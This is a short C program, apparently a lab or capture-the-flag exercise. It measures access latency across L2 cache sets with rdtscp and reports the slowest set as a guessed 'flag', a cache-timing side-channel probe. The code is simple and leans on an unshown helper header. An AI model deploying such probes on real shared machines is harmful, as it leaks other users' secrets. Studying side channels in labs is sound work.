// attacker.c
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <unistd.h>   // For sleep()
#include "util.h"     // For get_buffer(), rdtscp64()

#define NUM_SETS 2048        // Number of L2 sets on Skylake (assumption)
#define SAMPLE_COUNT 100     // Number of samples per set

uint64_t probe_one_set(uint8_t *buffer, int set_index) {
    uint64_t start, end, delta;
    volatile uint8_t *addr;

    addr = buffer + (set_index << 6);  // cache line size = 64 bytes = 2^6
    start = rdtscp64();
    *addr;  // Memory access
    end = rdtscp64();
    delta = end - start;
    return delta;
}

int main() {
    uint8_t *buffer = get_buffer();  // Allocate hugepage
    if (buffer == NULL) {
        printf("Failed to allocate buffer.\n");
        return 1;
    }

    printf("Attacker started...\n");

    uint64_t times[NUM_SETS];

    while (1) {
        // Initialize times array
        for (int i = 0; i < NUM_SETS; i++) {
            times[i] = 0;
        }

        // Measure each set
        for (int sample = 0; sample < SAMPLE_COUNT; sample++) {
            for (int i = 0; i < NUM_SETS; i++) {
                times[i] += probe_one_set(buffer, i);
            }
        }

        // Find the set with maximum access time
        int flag = -1;
        uint64_t max_latency = 0;
        for (int i = 0; i < NUM_SETS; i++) {
            if (times[i] > max_latency) {
                max_latency = times[i];
                flag = i;
            }
        }

        printf("Guessed flag: %d\n", flag);

        sleep(1);  // Pause before trying again
    }

    return 0;
}
